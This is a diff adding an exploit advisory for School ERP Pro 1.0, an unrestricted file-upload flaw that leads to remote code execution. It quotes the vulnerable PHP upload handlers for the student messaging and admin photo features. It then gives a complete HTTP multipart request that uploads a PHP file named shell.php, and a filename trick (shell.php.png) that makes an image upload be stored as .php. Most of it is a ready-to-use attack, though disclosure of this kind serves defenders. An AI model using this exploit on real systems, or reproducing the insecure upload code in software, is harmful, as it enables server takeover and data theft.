@@ -1,0 +1,103 @@
+# Exploit Title: School ERP Pro 1.0 - Remote Code Execution
+# Date: 2020-04-28
+# Author: Besim ALTINOK
+# Vendor Homepage: http://arox.in
+# Software Link: https://sourceforge.net/projects/school-erp-ultimate/
+# Version: latest version
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+Description
+-------------------------------------------
+A student can send a message to the admin. Additionally, with this method,
+the student can upload a PHP file to the system and run code in the system.
+
+------------------------------------
+*Vulnerable code - 1: (for student area) - sendmail.inc.php*
+- Student user can send message to admin with the attachment
+------------------------------------
+$image_file = basename($_FILES['newimage']['name'][$i]);
+$ext=explode(".",$_FILES['newimage']['name'][$i]);
+$str=date("mdY_hms");
+//$t=rand(1, 15);
+$new_thumbname = "$ext[0]".$str.$t.".".$ext[1];
+$updir = "images/messagedoc/";
+$dest_path = $updir.$new_thumbname;
+$up_images[$i] = $dest_path;
+$srcfile = $_FILES['newimage']['tmp_name'][$i];
+@move_uploaded_file($srcfile, $dest_path);
+$ins_arr_prod_images = array(
+'`es_messagesid`'  => $id,
+'`message_doc`'     => $new_thumbname
+);
+$idss=$db->insert("es_message_documents",$ins_arr_prod_images);
+
+---------------------------------------------------
+*PoC of the Remote Code Execution*
+---------------------------------------------------
+
+POST /erp/student_staff/index.php?pid=27&action=mailtoadmin HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 ***************************
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/erp/student_staff/index.php?pid=27&action=mailtoadmin
+Content-Type: multipart/form-data;
+boundary=---------------------------2104557667975595321153031663
+Content-Length: 718
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=8a7cca1efcb3ff66502ed010172d497a; expandable=5c
+Upgrade-Insecure-Requests: 1
+
+-----------------------------2104557667975595321153031663
+Content-Disposition: form-data; name="subject"
+
+DEDED
+-----------------------------2104557667975595321153031663
+Content-Disposition: form-data; name="message"
+
+<p>DEDED</p>
+-----------------------------2104557667975595321153031663
+Content-Disposition: form-data; name="newimage[]"; filename="shell.php"
+Content-Type: text/php
+
+<?php phpinfo(); ?>
+
+-----------------------------2104557667975595321153031663
+Content-Disposition: form-data; name="filecount[]"
+
+1
+-----------------------------2104557667975595321153031663
+Content-Disposition: form-data; name="submit_staff"
+
+Send
+-----------------------------2104557667975595321153031663--
+
+
+------------------------------------
+*Vulnerable code - 2: (for admin area) - pre-editstudent.inc.php*
+- Admin user can update user profile photo
+------------------------------------
+if (is_uploaded_file($_FILES['pre_image']['tmp_name'])) {
+$ext = explode(".",$_FILES['pre_image']['name']);
+$str = date("mdY_hms");
+$new_thumbname = "st_".$str."_".$ext[0].".".$ext[1];
+$updir = "images/student_photos/";
+$uppath = $updir.$new_thumbname;
+move_uploaded_file($_FILES['pre_image']['tmp_name'],$uppath);
+$file = $new_thumbname;
+
+------------------------------------
+Bypass Technique:
+------------------------------------
+
+$_FILES['pre_image']['name']; --- > shell.php.png
+$ext = explode(".",$_FILES['pre_image']['name']);
+---
+$new_thumbname = "st_".$str."_".$ext[0].".".$ext[1];
+$ext[0] --> shell
+$ext[1] --> php
+lastfilename --> st_date_shell.php
